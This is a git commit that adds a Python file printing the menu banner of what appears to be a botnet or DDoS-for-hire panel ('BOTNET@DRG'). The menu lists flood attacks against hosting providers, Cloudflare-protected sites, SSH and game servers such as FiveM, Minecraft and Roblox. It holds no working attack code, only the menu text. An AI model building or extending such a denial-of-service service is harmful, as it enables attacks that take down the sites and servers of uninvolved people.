cebd8052b465931d6d29fa08f247bb78d6a958ad
Huyhuy44 <93422738+Huyhuy44@users.noreply.github.com>
2022-08-30 12:08:57 +0700

    H
    J

---
+++ methods.py
@@ -0,0 +1,19 @@
+print("""
+╔══[ BOTNET@DRG ]                                                              
+╚════➤methods
+.home                           :home Flood. [VIP]
+.ovh                               :ovh tcp handshake flood. [VIP]
+.nfo                               :nfo tcp handshake flood. [VIP]
+.tcp                               :3 way handshake flood. [VIP]
+.udp                              :raw udp flood. [VIP]
+.game                          :game flood. [VIP]
+.https                           :basic https flood. [VIP]
+.cf-bypass                  :cloudflare bypass flood. [VIP]
+.socket                       :socket flood. [VIP]
+.mixamp                    :raw mixamp flood. [VIP]
+.shh                            :ssh flood. [VIP]
+.port-flood               :port flood. [VIP]
+.fivem                       :fivem game flood. [VIP]
+.minecraft              :minecraft game flood. [VIP]
+.roblox                    :roblox game flood. [VIP]
+""")
